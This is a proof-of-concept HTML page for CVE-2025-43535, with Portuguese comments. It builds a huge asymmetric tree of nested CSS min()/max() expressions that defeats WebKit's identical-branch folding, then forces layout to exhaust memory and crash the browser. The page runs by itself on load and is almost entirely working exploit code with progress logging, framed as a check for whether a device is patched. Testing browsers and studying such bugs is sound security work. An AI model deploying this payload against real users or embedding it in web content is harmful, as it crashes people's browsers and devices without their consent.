<!DOCTYPE html>
<!--
  PoC FINAL: CVE-2025-43535 — asymSym

  POR QUE % TAMBÉM NÃO FUNCIONOU:
  ════════════════════════════════════════════════════════════
  sym(N, leaf) cria min(leaf, leaf) em CADA nível.
  WebKit aplica min(x, x) = x como identidade ESTRUTURAL —
  independente de x ser px, % ou qualquer unidade.
  Não precisa saber o valor, só detectar que os dois ramos
  são a mesma expressão. Zero objetos criados.

  SOLUÇÃO — asymSym: trocar cA e cB a cada nível
  ════════════════════════════════════════════════════════════
  asymSym(N, cA, cB):
    N=0 → cA
    N>0 → min( asymSym(N-1, cA, cB),   ← filho esq usa A→B
               asymSym(N-1, cB, cA) )  ← filho dir usa B→A

  Em cada nó: filho_esq ≠ filho_dir (estruturas espelhadas)
  → WebKit não pode aplicar min(x,x)=x
  → DEVE criar ambos os objetos CSSCalcValue
  → 122M objetos no heap C++ → OOM → crash
-->
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace;
         padding:16px; margin:0; font-size:13px; }
  #log { background:#111; border:1px solid #2a4a2a; padding:10px;
         height:72vh; overflow-y:auto; font-size:11px; line-height:1.7; }
  .ok    { color:#00ff88 }
  .fail  { color:#ff4444 }
  .info  { color:#ffcc44 }
  .warn  { color:#ff8844 }
  .crash { color:#ff44ff; font-weight:bold }
  .dim   { color:#336633 }
  .bar   { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
           padding:6px 10px; margin-bottom:8px; font-size:11px; }
</style>
</head>
<body>
<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
  CVE-2025-43535 · asymSym · JS~1.2MB · sem blob · GitHub/PS4
</div>
<div class="bar" id="bar">Aguardando...</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
                       width:500px;height:500px;overflow:hidden">
  <div id="target" style="position:absolute;visibility:hidden"></div>
</div>

<script>
"use strict";

var logEl  = document.getElementById('log');
var barEl  = document.getElementById('bar');
var target = document.getElementById('target');

function L(m, c) {
  logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
  logEl.scrollTop = logEl.scrollHeight;
}
function bar(m) { barEl.textContent = m; }

function buildDepth(depth, leaf) {
  var e = leaf;
  for (var d = 1; d <= depth; d++) {
    var n = 'min(' + e + ',' + e + ')';
    e = null; e = n;
  }
  return e;
}

// ─────────────────────────────────────────────────────────────
// insertAsymSym: insere árvore assimétrica via TextNodes.
// A cada nível, filho_esq usa (cA,cB) e filho_dir usa (cB,cA).
// → Nenhum par de irmãos é estruturalmente idêntico.
// → WebKit não pode aplicar min(x,x)=x.
// Recursão máxima = 10 níveis → sem stack overflow.
// ─────────────────────────────────────────────────────────────
function insertAsymSym(parent, levels, cA, cB) {
  if (levels === 0) {
    parent.appendChild(document.createTextNode(cA));
    return;
  }
  parent.appendChild(document.createTextNode('min('));
  // filho esquerdo: A como primária, B como secundária
  insertAsymSym(parent, levels - 1, cA, cB);
  parent.appendChild(document.createTextNode(','));
  // filho direito: B como primária, A como secundária (TROCADO)
  insertAsymSym(parent, levels - 1, cB, cA);
  parent.appendChild(document.createTextNode(')'));
}

function run() {
  L('CVE-2025-43535 · asymSym (folding estrutural eliminado)', 'info');
  L('min(x,x)=x não aplicável: filhos sempre distintos', 'info');
  L('', '');

  bar('[1/4] Construindo cA(1%) e cB(2%)...');
  L('[1/4] cA = depth=16 com folha "1%" (576KB)...', 'warn');

  setTimeout(function() {

    var cA, cB;
    try {
      cA = buildDepth(16, '1%');
      cB = buildDepth(16, '2%');
      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB ✓', 'ok');
      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB ✓', 'ok');
      L('[1/4] JS heap: ~' + ((cA.length+cB.length)/1024).toFixed(0) + 'KB ✓', 'ok');
    } catch(e) {
      L('[1/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
    }

    bar('[2/4] Inserindo TextNodes assimétricos (1044MB)...');
    L('[2/4] asymSym: filho_esq(A,B) ≠ filho_dir(B,A) em cada nó', 'info');

    setTimeout(function() {

      var styleEl = document.createElement('style');
      try {
        styleEl.appendChild(document.createTextNode('#target{width:'));

        // Raiz: max() — precisa avaliar ambos os ramos para comparar
        styleEl.appendChild(document.createTextNode('max('));

          // Esquerdo: asymSym(10) = 576MB
          insertAsymSym(styleEl, 10, cA, cB);

          styleEl.appendChild(document.createTextNode(','));

          // Direito: min( asymSym(9), min(asymSym(8), asymSym(6)) )
          styleEl.appendChild(document.createTextNode('min('));
            insertAsymSym(styleEl, 9, cB, cA);   // 288MB — cB como primária
            styleEl.appendChild(document.createTextNode(','));
            styleEl.appendChild(document.createTextNode('min('));
              insertAsymSym(styleEl, 8, cA, cB); // 144MB
              styleEl.appendChild(document.createTextNode(','));
              insertAsymSym(styleEl, 6, cB, cA); //  36MB
            styleEl.appendChild(document.createTextNode(')'));
          styleEl.appendChild(document.createTextNode(')'));

        styleEl.appendChild(document.createTextNode(')}'));

        L('[2/4] ' + styleEl.childNodes.length + ' TextNodes ✓', 'ok');
        cA = null; cB = null;
        L('[2/4] cA e cB liberados ✓', 'ok');

      } catch(e) {
        cA = null; cB = null;
        L('[2/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
      }

      bar('[3/4] Conectando ao DOM...');
      L('[3/4] CSS parser indexa 1044MB de expressões assimétricas...', 'warn');
      L('[3/4] ◀◀ CRASH = CVE PRESENTE ▶▶', 'crash');

      setTimeout(function() {
        try {
          document.head.appendChild(styleEl);
          L('[3/4] Conectada ✓', 'ok');
        } catch(e) { L('[3/4] ' + e, 'fail'); }

        bar('[4/4] offsetWidth — resolvendo 122M objetos CSSCalcValue...');
        L('[4/4] TRIGGER: offsetWidth força layout...', 'warn');
        L('[4/4] ◀◀ CRASH AQUI = CVE PRESENTE ▶▶', 'crash');

        setTimeout(function() {
          try {
            void target.offsetWidth;
            var w = window.getComputedStyle(target).getPropertyValue('width');
            L('[4/4] width="' + w + '" ✓', 'ok');
          } catch(e) { L('[4/4] ' + e, 'fail'); }

          try { document.head.removeChild(styleEl); } catch(e) {}

          L('', '');
          L('═══════════════════════════════════════', 'warn');
          L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
          L('SEM CRASH = PATCHED', 'ok');
          L('═══════════════════════════════════════', 'warn');
          bar('DONE');
        }, 50);
      }, 50);
    }, 80);
  }, 100);
}

window.addEventListener('load', function() { setTimeout(run, 200); });
</script>
</body>
</html>
